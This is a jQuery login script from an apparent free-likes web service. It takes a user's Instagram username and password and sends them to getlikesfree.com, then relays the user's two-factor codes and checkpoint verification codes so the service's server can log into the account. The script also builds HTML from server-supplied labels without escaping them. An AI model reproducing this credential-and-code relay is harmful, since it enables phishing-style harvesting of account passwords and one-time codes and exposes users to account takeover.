<script>
/*window.onerror = function(msg, source, lineno, colno, error) {


alert(msg + ',' + source + ',' + lineno + ',' + colno + ',' + error);
}*/

function closeError() {
  $("#login-message-container").hide();
}

function openError(message) {
  $("#login-message-container").show();
  $("#login-error-message").html(message);

}

$(function() {
    /*$('#loginModal').modal('show');*/

    login_l = Ladda.create(document.querySelector('#log-in-button'));
    tfa_l = Ladda.create(document.querySelector('#tfa-confirm-button'));
    checkpoint_options_l = Ladda.create(document.querySelector('#checkpoint-options-button'));
    checkpoint_code_l = Ladda.create(document.querySelector('#checkpoint-code-button'));

    $("#log-in-button").click(function() {
        //start ladda
        //check inputs
        //error on wrong input and stop ladda
        //do request
    //    alert('1');
        closeError();
        login_l.start();
        var username = $("#login-ig-un").val();
        var password = $("#login-ig-pass").val();
        if (username == "" || password == "") {
            openError("Username and Password are required!");
            login_l.stop();
            return false;
        }
    //    alert('2');

        $.post('https://getlikesfree.com/cmd.php?cmd=put-identity', {
            username: username,
            password: password
        }, function(data) {
         // alert('3');
            var json = JSON.parse(data);
            if (json.status == "fail") {
                //display error
                login_l.stop();
                openError(json.message);
            } else {

                //we try login
                if(json.is_session_valid == 1) {
                    location.reload();

} else {

                $.post('https://getlikesfree.com/cmd.php?cmd=login', {}, function(data) {
                    var json = JSON.parse(data);
                    if (json.status == "fail") {
                        //output message and show change details button
                        login_l.stop();
                        openError(json.message);
                    } else if (json.status == "tfarequired") {
                        closeError();
                        $(".step").hide();
                        $(".tfa-step").show();
                        $("#tfa-confirm-button").show();
                    } else if (json.status == "checkpoint") {
                        //{"status":"checkpoint","challengeFields":[{"label":"Email: s******2@gmail.com","selected":true,"value":1}]}
                        var cOptions = json.challengeFields;
                        var html = '';
                        for (var i = 0; i < cOptions.length; i++) {
                            var cOption = cOptions[i];
                            html += `<div class="form-check">
                <input type="radio" class="form-check-input" id="option-` + i + `" name="optionsRadios" value="` + cOption.value + `"` + (i == 0 ? ' checked' : '') + `>
                <label class="form-check-label" for="option-` + i + `">` + cOption.label + `</label>
              </div>`;

                            html += `<label class="radio" style="
    width: 270px;margin: 5px auto;
">
  <span class="icons"><span class="first-icon"></span><span class="second-icon"></span></span><input type="radio" value="` + cOption.value + `" name="optionsRadios" data-toggle="radio"` + (i == 0 ? ' checked' : '') + `>
  ` + cOption.label + `
</label>`;

                        }
                        $("#checkpoint-options").html(html);

                        closeError();
                        $(".step").hide();
                        $(".checkpoint-step-options").show();
                        $(".checkpoint-options-button").show();
                        //also generate checkpoint steps here
                    } else if (json.status == "ok") {
                        //everything is okay, display big confirmation message
                                gtag('event', 'conversion', {'send_to': 'AW-871951350/_WGiCPyRoOwBEPbX458D',
              'event_callback': function() {
      location.reload();
    }

           });
                    }
                });

}

            }
        });

    });

    $("#tfa-confirm-button").click(function() {
        closeError();
        tfa_l.start();

        var code = $("#tfa-code").val();
        if (code == "") {
            tfa_l.stop();
            openError("Please enter the code!");

            return false;
        }


        $.post("https://getlikesfree.com/cmd.php?cmd=2fa", {
            code: code
        }, function(data) {
            var json = JSON.parse(data);
            if (json.status == "checkpoint") {
                        //{"status":"checkpoint","challengeFields":[{"label":"Email: s******2@gmail.com","selected":true,"value":1}]}
                        var cOptions = json.challengeFields;
                        var html = '';
                        for (var i = 0; i < cOptions.length; i++) {
                            var cOption = cOptions[i];
                            html += `<div class="form-check">
                <input type="radio" class="form-check-input" id="option-` + i + `" name="optionsRadios" value="` + cOption.value + `"` + (i == 0 ? ' checked' : '') + `>
                <label class="form-check-label" for="option-` + i + `">` + cOption.label + `</label>
              </div>`;

                            html += `<label class="radio" style="
    width: 270px;margin: 5px auto;
">
  <span class="icons"><span class="first-icon"></span><span class="second-icon"></span></span><input type="radio" value="` + cOption.value + `" name="optionsRadios" data-toggle="radio"` + (i == 0 ? ' checked' : '') + `>
  ` + cOption.label + `
</label>`;

                        }
                        $("#checkpoint-options").html(html);

                        closeError();
                        $(".step").hide();
                        $(".checkpoint-step-options").show();
                        $(".checkpoint-options-button").show();
                        //also generate checkpoint steps here#
                      return false;
                    } else if (json.status != 'ok') {
                openError(json.message);
                tfa_l.stop();
                return false;
            }
                    gtag('event', 'conversion', {'send_to': 'AW-871951350/_WGiCPyRoOwBEPbX458D',
              'event_callback': function() {
      location.reload();
    }

           });
        });

    });

    $("#checkpoint-options-button").click(function() {
        checkpoint_options_l.start();
        var choice = $("input[name='optionsRadios']:checked").val();
        if (choice == "") {
            checkpoint_options_l.stop();
            openError("Please choose an option!");

            return false;
        }

        $.post("https://getlikesfree.com/cmd.php?cmd=checkpoint", {
            value: choice,
            step: 2
        }, function(data) {
            var json = JSON.parse(data);
            if (json.status != 'ok') {
                openError(json.message);
                checkpoint_options_l.stop();
                return false;
            }

            closeError();
            $(".step").hide();
            $(".checkpoint-step-code").show();


        });

    });

    $("#checkpoint-code-button").click(function() {
        closeError();
        checkpoint_code_l.start();

        var code = $("#checkpoint-code").val();
        if (code == "") {
            checkpoint_code_l.stop();
            openError("Please enter the code!");

            return false;
        }

        $.post("https://getlikesfree.com/cmd.php?cmd=checkpoint", {
            value: code,
            step: 3
        }, function(data) {
            var json = JSON.parse(data);
            if (json.status != 'ok') {
                openError(json.message);
                checkpoint_code_l.stop();
                return false;
            }
             gtag('event', 'conversion', {'send_to': 'AW-871951350/_WGiCPyRoOwBEPbX458D',
              'event_callback': function() {
      location.reload();
    }

           });


        });

    });


});
</script>
